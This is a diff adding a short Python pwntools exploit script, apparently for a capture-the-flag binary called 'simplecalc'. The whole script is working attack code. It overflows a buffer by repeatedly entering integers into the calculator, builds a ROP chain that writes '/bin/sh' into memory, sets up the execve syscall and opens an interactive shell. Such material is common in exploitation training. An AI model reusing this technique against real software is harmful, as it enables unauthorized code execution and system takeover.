@@ -1,0 +1,55 @@
+from pwn import *
+
+target = process("./simplecalc")
+
+target.recvuntil("calculations: ")
+target.sendline('100')
+
+ropRax = 0x000000000044db34     # pop rax ; ret
+ropRdx = 0x0000000000437a85     # pop rdx ; ret
+ropRdi = 0x0000000000401b73     # pop rdi ; ret
+ropRsi = 0x0000000000401c87     # pop rsi ; ret
+movGadget = 0x000000000044526e  # mov qword ptr [rax], rdx ; ret
+syscall = 0x0000000000400488    # syscall
+
+
+def addSingle(x):
+    target.recvuntil("=> ")
+    target.sendline("1")
+    target.recvuntil("Integer x: ")
+    target.sendline("100")
+    target.recvuntil("Integer y: ")
+    target.sendline(str(x-100)) # fill the buffer with (x + 100 - 100)
+
+# 64-bit address should convert to int twice
+def add(x):
+    y = x & 0xffffffff
+    z = (x & 0xffffffff00000000) >> 32
+    addSingle(y)
+    addSingle(z)
+
+
+for x in range(9):
+    add(0)
+
+bufAddr = 0x6c1000  
+
+# write '/bin/sh' to bufAddr
+add(ropRax)
+add(bufAddr)
+add(ropRdx)
+add(0x0068732f6e69622f) # "/bin/sh" in hex
+add(movGadget)
+
+add(ropRax)
+add(0x3b)
+add(ropRdi)
+add(bufAddr)
+add(ropRdx)
+add(0)
+add(ropRsi)
+add(0)
+add(syscall)
+
+target.sendline('5')    # run case:5
+target.interactive()
